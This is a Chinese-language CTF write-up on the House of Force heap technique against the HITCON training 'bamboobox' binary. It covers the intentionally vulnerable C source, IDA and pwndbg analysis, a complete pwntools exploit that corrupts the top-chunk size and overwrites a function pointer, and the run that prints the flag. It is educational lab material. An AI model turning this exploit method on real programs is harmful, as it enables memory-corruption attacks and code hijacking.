上一小节讲解了HOF的基本原理，这一小节来看看一道例题。

> 题目来源：HITCON training lab 11
>
> **<font style="color:#F5222D;">附件：</font>**
>
> 链接: [https://pan.baidu.com/s/1qdOlp9RT_7mxhw_187ugXQ](https://pan.baidu.com/s/1qdOlp9RT_7mxhw_187ugXQ)  密码: abtk
>
> --来自百度网盘超级会员V3的分享
>

# Linux环境
老规矩，首先看一下Linux环境：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605084129703-5710b94a-5918-4f14-ad96-48cd718744e2.png)

# ![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605084243524-93c74bb4-a00e-478c-83ac-792e5c16c498.png)
顺便再检查一下文件的保护情况

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605149680491-388944eb-e0d6-4cc1-b2d1-cbf7bc840d8f.png)

# 程序的源代码
```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
struct item {
  int size;
  char *name;
};

struct item itemlist[100] = {0};

int num;

void hello_message() {
  puts("There is a box with magic");
  puts("what do you want to do in the box");
}

void goodbye_message() {
  puts("See you next time");
  puts("Thanks you");
}

struct box {
  void (*hello_message)();
  void (*goodbye_message)();
};

void menu() {
  puts("----------------------------");
  puts("Bamboobox Menu");
  puts("----------------------------");
  puts("1.show the items in the box");
  puts("2.add a new item");
  puts("3.change the item in the box");
  puts("4.remove the item in the box");
  puts("5.exit");
  puts("----------------------------");
  printf("Your choice:");
}

void show_item() {
  int i;
  if (!num) {
    puts("No item in the box");
  } else {
    for (i = 0; i < 100; i++) {
      if (itemlist[i].name) {
        printf("%d : %s", i, itemlist[i].name);
      }
    }
    puts("");
  }
}

int add_item() {

  char sizebuf[8];
  int length;
  int i;
  int size;
  if (num < 100) {
    printf("Please enter the length of item name:");
    read(0, sizebuf, 8);
    length = atoi(sizebuf);
    if (length == 0) {
      puts("invaild length");
      return 0;
    }
    for (i = 0; i < 100; i++) {
      if (!itemlist[i].name) {
        itemlist[i].size = length;
        itemlist[i].name = (char *)malloc(length);
        printf("Please enter the name of item:");
        size = read(0, itemlist[i].name, length);
        itemlist[i].name[size] = '\x00';
        num++;
        break;
      }
    }

  } else {
    puts("the box is full");
  }
  return 0;
}

void change_item() {

  char indexbuf[8];
  char lengthbuf[8];
  int length;
  int index;
  int readsize;

  if (!num) {
    puts("No item in the box");
  } else {
    printf("Please enter the index of item:");
    read(0, indexbuf, 8);
    index = atoi(indexbuf);
    if (itemlist[index].name) {
      printf("Please enter the length of item name:");
      read(0, lengthbuf, 8);
      length = atoi(lengthbuf);
      printf("Please enter the new name of the item:");
      readsize = read(0, itemlist[index].name, length);
      *(itemlist[index].name + readsize) = '\x00';
    } else {
      puts("invaild index");
    }
  }
}

void remove_item() {
  char indexbuf[8];
  int index;

  if (!num) {
    puts("No item in the box");
  } else {
    printf("Please enter the index of item:");
    read(0, indexbuf, 8);
    index = atoi(indexbuf);
    if (itemlist[index].name) {
      free(itemlist[index].name);
      itemlist[index].name = 0;
      itemlist[index].size = 0;
      puts("remove successful!!");
      num--;
    } else {
      puts("invaild index");
    }
  }
}

void magic() {
  int fd;
  char buffer[100];
  fd = open("./flag", O_RDONLY);
  read(fd, buffer, sizeof(buffer));
  close(fd);
  printf("%s", buffer);
  exit(0);
}

int main() {

  char choicebuf[8];
  int choice;
  struct box *bamboo;
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  bamboo = malloc(sizeof(struct box));
  bamboo->hello_message = hello_message;
  bamboo->goodbye_message = goodbye_message;
  bamboo->hello_message();

  while (1) {
    menu();
    read(0, choicebuf, 8);
    choice = atoi(choicebuf);
    switch (choice) {
    case 1:
      show_item();
      break;
    case 2:
      add_item();
      break;
    case 3:
      change_item();
      break;
    case 4:
      remove_item();
      break;
    case 5:
      bamboo->goodbye_message();
      exit(0);
      break;
    default:
      puts("invaild choice!!!");
      break;
    }
  }

  return 0;
}
```

# IDA静态分析
将文件载入到IDA中，来大致的看一下程序。

> 这里使用github上的 i64IDA数据库文件进行分析，因为这个数据库将程序的结构体修复了，我自己懒得修复
>
> [https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-force/hitcontraning_lab11](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-force/hitcontraning_lab11)
>

## main函数
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  _QWORD *v3; // [rsp+8h] [rbp-18h]
  char buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  v3 = malloc(0x10uLL);
  *v3 = hello_message;                          // There is a box with magic
                                                // what do you want to do in the box
                                                // 
  v3[1] = goodbye_message;                      // See you next time
                                                // Thanks you
                                                // 
  ((void (__fastcall *)(signed __int64, _QWORD))*v3)(16LL, 0LL);
  while ( 1 )
  {
    menu();
    read(0, &buf, 8uLL);
    switch ( atoi(&buf) )
    {
      case 1:
        show_item();
        break;
      case 2:
        add_item();
        break;
      case 3:
        change_item();
        break;
      case 4:
        remove_item();
        break;
      case 5:
        ((void (__fastcall *)(char *, char *))v3[1])(&buf, &buf);
        exit(0);
        return;
      default:
        puts("invaild choice!!!");
        break;
    }
  }
}
```

main函数其实没有什么好说的，但是值得注意的是程序开头就申请了一片堆空间来存放hello_message和goodbye_message，并在程序开始的时候调用hello_message和在程序结束的时候调用goodbye_message。

## menu函数
```c
void __cdecl menu()
{
  puts("----------------------------");
  puts("Bamboobox Menu");
  puts("----------------------------");
  puts("1.show the items in the box");
  puts("2.add a new item");
  puts("3.change the item in the box");
  puts("4.remove the item in the box");
  puts("5.exit");
  puts("----------------------------");
  printf("Your choice:");
}
```

这是一个程序的菜单函数，没有什么特别的。

## 1、show_item
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605150638943-a4f76527-b8e2-4806-b329-07079d552752.png)首先判断存放于bss段的全局变量num是否有数据，然后进入循环打印程序各个结构体的内容，没有什么好看的。

## 2、add_item
此函数主要是用来为程序添加结构体的内容：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605150955512-6aa933c2-7fc6-45bd-b1d5-7f1134448feb.png)

> 注意：程序的index是从0开始的。
>

## 3、change_item
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605171123369-7e122113-7e31-4929-bd0c-f2b91b53b2ce.png)

> **<font style="color:#F5222D;">可以实现任意堆溢出的函数</font>**
>

## 4、remove_item
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605151545930-455c5435-a3a3-4dd8-ad0d-d27888cbe5ef.png)

## magic函数（我们的target）
```c
void __noreturn magic()
{
  int fd; // ST0C_4
  char buf; // [rsp+10h] [rbp-70h]
  unsigned __int64 v2; // [rsp+78h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  fd = open("./flag", 0);
  read(fd, &buf, 0x64uLL);
  close(fd);
  printf("%s", &buf);
  exit(0);
}
```

> 这个函数是我们的目标，让程序跳转到magic函数。
>

## IDA中修复的结构体
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605166428487-4f8e4a09-fa82-473b-97fc-3949b70d1ffd.png)

可以看到struct中有size和content

---

函数已经静态分析完毕了，也知道了程序所存在的漏洞，接下来开始动态调试。

# pwndbg动态调试
## 堆内存分布
首先使用gdb动态调试程序，创建两个堆块，然后进入调试模式，详细信息如下面的代码框所示：

> chunk0:size=10，content="aaaaa"
>
> chunk1:size=20，content="bbbbb"
>

```powershell
➜  Desktop gdb bamboobox 
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from bamboobox...(no debugging symbols found)...done.
pwndbg> r
Starting program: /home/ubuntu/Desktop/bamboobox 
There is a box with magic
what do you want to do in the box
----------------------------
Bamboobox Menu
----------------------------
1.show the items in the box
2.add a new item
3.change the item in the box
4.remove the item in the box
5.exit
----------------------------
Your choice:2
Please enter the length of item name:10
Please enter the name of item:aaaaa 
----------------------------
Bamboobox Menu
----------------------------
1.show the items in the box
2.add a new item
3.change the item in the box
4.remove the item in the box
5.exit
----------------------------
Your choice:2
Please enter the length of item name:20
Please enter the name of item:bbbbb 
----------------------------
Bamboobox Menu
----------------------------
1.show the items in the box
2.add a new item
3.change the item in the box
4.remove the item in the box
5.exit
----------------------------
Your choice:1
0 : aaaaa
1 : bbbbb

----------------------------
Bamboobox Menu
----------------------------
1.show the items in the box
2.add a new item
3.change the item in the box
4.remove the item in the box
5.exit
----------------------------
Your choice:^C
Program received signal SIGINT, Interrupt.
0x00007ffff7b04320 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────
 RAX  0xfffffffffffffe00
 RBX  0x0
 RCX  0x7ffff7b04320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x8
 RDI  0x0
 RSI  0x7fffffffde20 —▸ 0x7fffffff0a31 ◂— 0x0
 R8   0x7ffff7fda700 ◂— 0x7ffff7fda700
 R9   0xc
 R10  0x6
 R11  0x246
 R12  0x4007a0 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffdf10 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffde30 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15
 RSP  0x7fffffffde08 —▸ 0x400e5d (main+166) ◂— lea    rax, [rbp - 0x10]
 RIP  0x7ffff7b04320 (__read_nocancel+7) ◂— cmp    rax, -0xfff
──────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────
 ► 0x7ffff7b04320 <__read_nocancel+7>     cmp    rax, -0xfff
   0x7ffff7b04326 <__read_nocancel+13>    jae    read+73 <read+73>
    ↓
   0x7ffff7b04359 <read+73>               mov    rcx, qword ptr [rip + 0x2ccb18]
   0x7ffff7b04360 <read+80>               neg    eax
   0x7ffff7b04362 <read+82>               mov    dword ptr fs:[rcx], eax
   0x7ffff7b04365 <read+85>               or     rax, 0xffffffffffffffff
   0x7ffff7b04369 <read+89>               ret    
 
   0x7ffff7b0436a                         nop    word ptr [rax + rax]
   0x7ffff7b04370 <write>                 cmp    dword ptr [rip + 0x2d23c9], 0 <0x7ffff7dd6740>
   0x7ffff7b04377 <write+7>               jne    write+25 <write+25>
    ↓
   0x7ffff7b04389 <write+25>              sub    rsp, 8
───────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────
00:0000│ rsp  0x7fffffffde08 —▸ 0x400e5d (main+166) ◂— lea    rax, [rbp - 0x10]
01:0008│      0x7fffffffde10 ◂— 0x100400ee0
02:0010│      0x7fffffffde18 —▸ 0x603010 —▸ 0x400896 (hello_message) ◂— push   rbp
03:0018│ rsi  0x7fffffffde20 —▸ 0x7fffffff0a31 ◂— 0x0
04:0020│      0x7fffffffde28 ◂— 0x1c386820d9c25600
05:0028│ rbp  0x7fffffffde30 —▸ 0x400ee0 (__libc_csu_init) ◂— push   r15
06:0030│      0x7fffffffde38 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax
07:0038│      0x7fffffffde40 ◂— 0x1
─────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────
 ► f 0     7ffff7b04320 __read_nocancel+7
   f 1           400e5d main+166
   f 2     7ffff7a2d840 __libc_start_main+240
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
```

然后来看一下堆的情况：

```powershell
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x603000
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x603020
Size: 0x21

Allocated chunk | PREV_INUSE
Addr: 0x603040
Size: 0x21

Top chunk | PREV_INUSE
Addr: 0x603060
Size: 0x20fa1

pwndbg> 
```

堆的内存情况：

```powershell
pwndbg> x/30gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000021 #func_start_malloc_chunk
0x603010:	0x0000000000400896	0x00000000004008b1
0x603020:	0x0000000000000000	0x0000000000000021 #chunk0
0x603030:	0x00000a6161616161	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000021 #chunk1
0x603050:	0x00000a6262626262	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000020fa1 #top_chunk
......(省略内容均为空)
0x6030e0:	0x0000000000000000	0x0000000000000000
pwndbg> 
//为什么两个堆块的大小都是为0x21？
//虽然输入chunk的size为10和20，但是在x64位系统中chunk的size最小大小为0x21
//因此两个堆块的大小为0x21
```

上面代码框中标注的func_start_malloc_chunk是程序一开始就向内存申请的堆空间，来看一下malloc_data中的地址：

> 汇编代码请结合IDA食用～
>
> ![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605165129461-bcb1560b-f248-42c6-ad24-aea80dd37670.png)
>

```powershell
pwndbg> x/16gx 0x400896
0x400896 <hello_message>:	0x400f68bfe5894855	0x88bffffffe3ce800 
													#hello_message的汇编代码
0x4008a6 <hello_message+16>:	0xfffffe32e800400f	0xbfe5894855c35d90
0x4008b6 <goodbye_message+5>:	0xfffe21e800400faa	0x17e800400fbcbfff
															#goodbye_message的汇编代码
0x4008c6 <goodbye_message+21>:	0x4855c35d90fffffe	0xe800400fc7bfe589
0x4008d6 <menu+10>:	0x400fe4bffffffe06	0xc7bffffffdfce800
0x4008e6 <menu+26>:	0xfffffdf2e800400f	0xfde8e800400ff3bf
0x4008f6 <menu+42>:	0xe80040100fbfffff	0x401020bffffffdde
0x400906 <menu+58>:	0x3dbffffffdd4e800	0xfffffdcae8004010
pwndbg>
```

因此，我们来完善一下内容：

```powershell
pwndbg> x/30gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000021 #func_start_malloc_chunk
0x603010:	0x0000000000400896	0x00000000004008b1
					#hello_message      #goodbye_message
0x603020:	0x0000000000000000	0x0000000000000021 #chunk0
0x603030:	0x00000a6161616161	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000021 #chunk1
0x603050:	0x00000a6262626262	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000020fa1 #top_chunk
......(省略内容均为空)
0x6030e0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

## bss段的全局变量
再结合IDA看一下bss段的全局变量：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605165259528-a1d705cf-e501-439b-910a-d1c6747550b5.png)![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605165348454-f11b1fd3-b2ba-42c3-991b-2aa10e3a2de4.png)

> num记录着堆块的数量。
>

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605165459144-f39493be-217e-4e51-9c74-edb737f8e578.png)

```c
pwndbg> x/10gx 0x6020c0
0x6020c0 <itemlist>:	0x000000000000000a	0x0000000000603030 #chunk0
						#struct_size        #struct_content_ptr
0x6020d0 <itemlist+16>:	0x0000000000000014	0x0000000000603050 #chunk1
						#struct_size        #struct_content_ptr
0x6020e0 <itemlist+32>:	0x0000000000000000	0x0000000000000000
0x6020f0 <itemlist+48>:	0x0000000000000000	0x0000000000000000
0x602100 <itemlist+64>:	0x0000000000000000	0x0000000000000000
pwndbg> 
//注意struct_content_ptr指向malloc出来malloc_data的地址
```

> itemlist存放这程序的结构体。
>

# 攻击原理及exp
## exp
> exp来自@yichen师傅：[https://www.yuque.com/hxfqg9/bin/gwcg1c#a17be](https://www.yuque.com/hxfqg9/bin/gwcg1c#a17be)
>
> flag文件需要自己创建
>

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
p = process('./bamboobox')

def cmd(choice):
  p.sendlineafter('',str(choice))
  
def create(size,content):
  cmd(2)
  p.sendlineafter('item name:',str(size))
  p.sendlineafter('item:',content)

def edit(index,size,content):
  cmd(3)
  p.sendlineafter('of item:',str(index))
  p.sendlineafter('item name:',str(size))
  p.sendlineafter('the item:',content)

def delete(index):
  cmd(4)
  p.sendlineafter('of item:',str(index))

def quit():
  cmd(5)

magic = 0x400d49
create(0x30, "aaaa")
content='a'*0x30+'1'*8+p64(0xffffffffffffffff)
edit(0,0x40,content)
offset=-0x60-0x10
create(offset,'bbbb')
create(0x10,p64(magic)*2)
quit()
p.interactive()
```

## payload分析
我们的目标是修改堆中的0x4008b1（goodbye_message）为magic函数地址：

```powershell
--------------------------------------------------------------------------
修改之前：
pwndbg> x/30gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000021 #func_start_malloc_chunk
0x603010:	0x0000000000400896	0x00000000004008b1
					#hello_message      #goodbye_message
--------------------------------------------------------------------------
我们所期望的：
pwndbg> x/30gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000021 #func_start_malloc_chunk
0x603010:	0x0000000000400896	0x0000000000400d49
					#hello_message      #magic函数
```

```python
def cmd(choice):
  p.sendlineafter('',str(choice))
  
def create(size,content):
  cmd(2)
  p.sendlineafter('item name:',str(size))
  p.sendlineafter('item:',content)

def edit(index,size,content):
  cmd(3)
  p.sendlineafter('of item:',str(index))
  p.sendlineafter('item name:',str(size))
  p.sendlineafter('the item:',content)

def delete(index):
  cmd(4)
  p.sendlineafter('of item:',str(index))

def quit():
  cmd(5)
```

首先来看第一部分的payload，这些代码的主要功能是自动化执行程序的功能。也是exp中最基础的部分，没有什么好说的。

```python
create(0x30, "aaaa")
```

gdb时程序的内存分布如下：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605170484395-adbcda44-2fa5-4dfc-b030-7d0c25e8bd9b.png)

执行完上面的payload之后堆块的状况如下：

```python
pwndbg> x/30gx 0xe80000
0xe80000:	0x0000000000000000	0x0000000000000021 #func_start_malloc_chunk
0xe80010:	0x0000000000400896	0x00000000004008b1
    		#hello_message      #goodbye_message
0xe80020:	0x0000000000000000	0x0000000000000041 #chunk0（malloc(0x30)）
0xe80030:	0x0000000a61616161	0x0000000000000000
0xe80040:	0x0000000000000000	0x0000000000000000
0xe80050:	0x0000000000000000	0x0000000000000000
0xe80060:	0x0000000000000000	0x0000000000020fa1 #top_chunk
0xe80070:	0x0000000000000000	0x0000000000000000
0xe80080:	0x0000000000000000	0x0000000000000000
0xe80090:	0x0000000000000000	0x0000000000000000
0xe800a0:	0x0000000000000000	0x0000000000000000
0xe800b0:	0x0000000000000000	0x0000000000000000
0xe800c0:	0x0000000000000000	0x0000000000000000
0xe800d0:	0x0000000000000000	0x0000000000000000
0xe800e0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

然后我们编辑刚才创建的堆块（index0）：

```python
content='a'*0x30+'1'*8+p64(0xffffffffffffffff)
edit(0,0x40,content)
```

再看一下堆块的情况：

```python
pwndbg> x/30gx 0xe80000
0xe80000:	0x0000000000000000	0x0000000000000021 #func_start_malloc_chunk
0xe80010:	0x0000000000400896	0x00000000004008b1
    		#hello_message      #goodbye_message
0xe80020:	0x0000000000000000	0x0000000000000041 #chunk0（malloc(0x30)）
0xe80030:	0x6161616161616161	0x6161616161616161
0xe80040:	0x6161616161616161	0x6161616161616161
0xe80050:	0x6161616161616161	0x6161616161616161
0xe80060:	0x3131313131313131	0xffffffffffffffff #top_chunk
0xe80070:	0x0000000000000000	0x0000000000000000
......（省略内容均为空）
0xe800e0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

从上面的内容可以看到，top_chunk的size已经被更改为0xffffffffffffffff，利用它我们就可以控制任意内存的地址。继续向下看paylaod：

```python
offset=-0x60-0x10
create(offset,'bbbb')
```

这个offset怎么来的？

首先要明确目标为修改goodbye_message函数为magic函数。在gdb调试中，goodbye_message函数指针的地址为：0xe80010，现在的top_chunk地址为0xe80060

要想修改地址，应该将 top_chunk 指向0xe80000（heap_base）处，这样当下次再分配chunk时，就可以分配到goodbye_message处的内存了。

---

如何计算？本题是向低地址移动，将上一小节的公式带入到本题中：

malloc_size=0xe80000-0xe80060-0x10=-0x70

因此要malloc(-0x70)，完成此步骤之后堆内存如下图所示：

```python
pwndbg> x/30gx 0xe80000
0xe80000:	0x0000000000000000	0x0000000000000059 #new_top_chunk
0xe80010:	0x0000000000400896	0x00000000004008b1
    		#hello_message      #goodbye_message
0xe80020:	0x0000000000000000	0x0000000000000041 #chunk0（malloc(0x30)）
0xe80030:	0x6161616161616161	0x6161616161616161
0xe80040:	0x6161616161616161	0x6161616161616161
0xe80050:	0x6161616161616161	0x6161616161616161
0xe80060:	0x3131313131313131	0xffffffffffffffa1 #old_top_chunk
0xe80070:	0x0000000000000000	0x0000000000000000
......（省略内容均为空）
0xe800e0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

此时已经可以控制goodbye_message的地址，覆盖后退出程序就可以触发magic函数。

```python
create(0x10,p64(magic)*2)
```

```python
pwndbg> x/30gx 0xe80000
0xe80000:	0x0000000000000000	0x0000000000000021 #现在已经被控制的chunk
0xe80010:	0x0000000000400d49	0x0000000000400d49
    		#hello_message      #magic
0xe80020:	0x0000000000000000	0x0000000000000039 #chunk0（malloc(0x30)）
0xe80030:	0x6161616161616161	0x6161616161616161
0xe80040:	0x6161616161616161	0x6161616161616161
0xe80050:	0x6161616161616161	0x6161616161616161
0xe80060:	0x3131313131313131	0xffffffffffffffa1 #top_chunk
0xe80070:	0x0000000000000000	0x0000000000000000
......（省略内容均为空）
0xe800e0:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

## debug-exp
> 请在同级目录下创建flag文件
>

```python
➜  ~ cd Desktop/
➜  Desktop python yichen.py
[+] Starting local process './bamboobox' argv=['./bamboobox'] : pid 29277
[DEBUG] Received 0x11c bytes:
    'There is a box with magic\n'
    'what do you want to do in the box\n'
    '----------------------------\n'
    'Bamboobox Menu\n'
    '----------------------------\n'
    '1.show the items in the box\n'
    '2.add a new item\n'
    '3.change the item in the box\n'
    '4.remove the item in the box\n'
    '5.exit\n'
    '----------------------------\n'
    'Your choice:'
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x25 bytes:
    'Please enter the length of item name:'
[DEBUG] Sent 0x3 bytes:
    '48\n'
[DEBUG] Received 0x1e bytes:
    'Please enter the name of item:'
[DEBUG] Sent 0x5 bytes:
    'aaaa\n'
[DEBUG] Received 0xe0 bytes:
    '----------------------------\n'
    'Bamboobox Menu\n'
    '----------------------------\n'
    '1.show the items in the box\n'
    '2.add a new item\n'
    '3.change the item in the box\n'
    '4.remove the item in the box\n'
    '5.exit\n'
    '----------------------------\n'
    'Your choice:'
[DEBUG] Sent 0x2 bytes:
    '3\n'
[DEBUG] Received 0x1f bytes:
    'Please enter the index of item:'
[DEBUG] Sent 0x2 bytes:
    '0\n'
[DEBUG] Received 0x25 bytes:
    'Please enter the length of item name:'
[DEBUG] Sent 0x3 bytes:
    '64\n'
[DEBUG] Received 0x26 bytes:
    'Please enter the new name of the item:'
[DEBUG] Sent 0x41 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000030  31 31 31 31  31 31 31 31  ff ff ff ff  ff ff ff ff  │1111│1111│····│····│
    00000040  0a                                                  │·│
    00000041
[DEBUG] Received 0x1d2 bytes:
    '----------------------------\n'
    'Bamboobox Menu\n'
    '----------------------------\n'
    '1.show the items in the box\n'
    '2.add a new item\n'
    '3.change the item in the box\n'
    '4.remove the item in the box\n'
    '5.exit\n'
    '----------------------------\n'
    'Your choice:invaild choice!!!\n'
    '----------------------------\n'
    'Bamboobox Menu\n'
    '----------------------------\n'
    '1.show the items in the box\n'
    '2.add a new item\n'
    '3.change the item in the box\n'
    '4.remove the item in the box\n'
    '5.exit\n'
    '----------------------------\n'
    'Your choice:'
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x25 bytes:
    'Please enter the length of item name:'
[DEBUG] Sent 0x5 bytes:
    '-112\n'
[DEBUG] Received 0xfe bytes:
    'Please enter the name of item:----------------------------\n'
    'Bamboobox Menu\n'
    '----------------------------\n'
    '1.show the items in the box\n'
    '2.add a new item\n'
    '3.change the item in the box\n'
    '4.remove the item in the box\n'
    '5.exit\n'
    '----------------------------\n'
    'Your choice:'
[DEBUG] Sent 0x5 bytes:
    'bbbb\n'
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x117 bytes:
    'invaild choice!!!\n'
    '----------------------------\n'
    'Bamboobox Menu\n'
    '----------------------------\n'
    '1.show the items in the box\n'
    '2.add a new item\n'
    '3.change the item in the box\n'
    '4.remove the item in the box\n'
    '5.exit\n'
    '----------------------------\n'
    'Your choice:Please enter the length of item name:'
[DEBUG] Sent 0x3 bytes:
    '16\n'
[DEBUG] Received 0x1e bytes:
    'Please enter the name of item:'
[DEBUG] Sent 0x11 bytes:
    00000000  49 0d 40 00  00 00 00 00  49 0d 40 00  00 00 00 00  │I·@·│····│I·@·│····│
    00000010  0a                                                  │·│
    00000011
[DEBUG] Received 0x1d2 bytes:
    '----------------------------\n'
    'Bamboobox Menu\n'
    '----------------------------\n'
    '1.show the items in the box\n'
    '2.add a new item\n'
    '3.change the item in the box\n'
    '4.remove the item in the box\n'
    '5.exit\n'
    '----------------------------\n'
    'Your choice:invaild choice!!!\n'
    '----------------------------\n'
    'Bamboobox Menu\n'
    '----------------------------\n'
    '1.show the items in the box\n'
    '2.add a new item\n'
    '3.change the item in the box\n'
    '4.remove the item in the box\n'
    '5.exit\n'
    '----------------------------\n'
    'Your choice:'
[DEBUG] Sent 0x2 bytes:
    '5\n'
[*] Switching to interactive mode
----------------------------
Bamboobox Menu
----------------------------
1.show the items in the box
2.add a new item
3.change the item in the box
4.remove the item in the box
5.exit
----------------------------
Your choice:invaild choice!!!
----------------------------
Bamboobox Menu
----------------------------
1.show the items in the box
2.add a new item
3.change the item in the box
4.remove the item in the box
5.exit
----------------------------
Your choice:[*] Process './bamboobox' stopped with exit code 0 (pid 29277)
[DEBUG] Received 0x15 bytes:
    'flag{house_of_force}\n'
flag{house_of_force}
[*] Got EOF while reading in interactive
$  
```

